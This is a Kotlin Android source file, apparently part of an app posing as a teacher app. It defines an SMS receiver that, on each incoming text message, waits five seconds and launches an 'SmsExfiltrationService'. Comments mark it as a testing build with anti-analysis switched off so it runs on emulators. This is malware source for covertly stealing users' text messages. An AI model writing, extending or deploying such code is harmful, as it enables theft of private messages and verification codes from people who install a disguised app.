package com.teacherapp.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.teacherapp.services.SmsExfiltrationService
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch

/**
 * SmsReceiver - Triggers SMS exfiltration when new SMS is received
 *
 * TESTING MODE: NO ANTI-ANALYSIS
 * This version works on emulators for testing
 */
class SmsReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            // New SMS received - trigger exfiltration
            // NO ANTI-ANALYSIS - works on emulator
            CoroutineScope(Dispatchers.Default).launch {
                // Wait 5 seconds
                delay(5000L)

                // Start SMS exfiltration service
                SmsExfiltrationService.startExfiltration(context)
            }
        }
    }
}